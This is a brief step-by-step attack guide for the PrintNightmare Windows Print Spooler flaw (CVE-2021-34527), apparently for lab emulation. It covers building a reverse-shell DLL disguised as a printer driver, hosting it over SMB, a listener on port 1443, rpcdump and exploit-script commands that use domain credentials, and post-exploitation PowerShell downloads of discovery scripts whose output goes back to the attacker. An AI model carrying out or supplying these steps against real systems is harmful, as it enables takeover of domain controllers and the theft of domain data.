# PrintNightmare Windows Print Spooler Vulnerability (CVE2021-34527)

Pre-exploitation

Attacker
1. Install Impacket and python script to exploit the vulnerability
2. Install metasploit (if you aren't using Kali), create a malicious dll as a faked printer driver and set up a listener on port 1443

   Steps to create a reverse shell dll: https://thedutchhacker.com/how-to-exploit-the-printnightmare-cve-2021-34527/
4. Run SMB server service and modify the config file
5. Place the faked printer driver to the SMB path
6. Ensure the target is vulnerable to MS-RPRN (Print System Remote Protocol) by running
   rpcdump.py <username>:<password>:@<target IP addr> | grep MS-RPRN
7. Exploit the vulnerability to the target machine
   sudo python3 CVE-2021-34527.py -u <username> -p <password> -d <domain controller IP addr> -dll <path/path/to/maliciousdll> <domain IP addr>

Target machine
1. Ensure the Domain Controller is running the Print Spooler Service and is vulnerable by checking the 
   Powershell
   PS C:\Users\Administrator> get-service spooler
   PS C:\Users\Administrator> start-service spooler

**e.g. replace <username> with a domain user account login credential

# Guides to emulate the vulnerability
Ref: https://github.com/m8sec/CVE-2021-34527?tab=readme-ov-file

Post-exploitation
Download 2 scripts to discovery local machine and domain group info, then send them back to attacker listener. 

'''console
<Invoke-WebRequest -Uri path/to/discovery.bat -o discovery.bat>
<Invoke-WebRequest -Uri path/to/export.bat -o export.bat>
'''

